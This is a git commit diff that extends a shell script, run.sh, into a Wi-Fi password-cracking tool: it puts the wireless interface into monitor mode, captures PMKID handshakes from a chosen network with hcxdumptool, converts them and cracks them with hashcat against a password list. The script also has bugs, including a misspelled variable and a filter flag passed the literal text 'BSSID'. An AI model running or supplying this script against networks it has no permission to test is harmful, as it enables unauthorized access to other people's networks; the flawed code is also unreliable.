1d13c9704015c2070576174ce475e85e8fb149d3
Benn271 <137446774+Benn271@users.noreply.github.com>
2024-01-06 17:06:12 -0600

    Update run.sh
    Adding the potential commands needed to crack the password

--- run.sh
+++ run.sh
@@ -23,8 +23,21 @@ ip a
 echo "input the wireless network interface from the list above (eg. wlan0, wlan1, wlan2, wlan3, etc.):"
 read wireless_interface
 
-echo "$wireless_interface"
+sudo airmon-ng start $wireless_interface
+sudo airodump-ng ${wireless_interface}mon
+echo "Enter the BSSID of the netowrk: "
+read BSSID
 
+echo "Enter a file name for the output to go to (to ending like .txt .pdf etc): "
+read OutputFile
 
+sudo hcxdumptool -i ${wireless_interface}mon -o $OutputFile --enable_status=1 --filterlist_ap=BSSID --filtermode=2
+
+sudo hcxcaptool -z hash.txt $OutputFile
+
+echo "Possible passwords location: "
+read passowrds
+
+sudo hashcat -m 16800 hash.txt $passwords
 
 exit 0
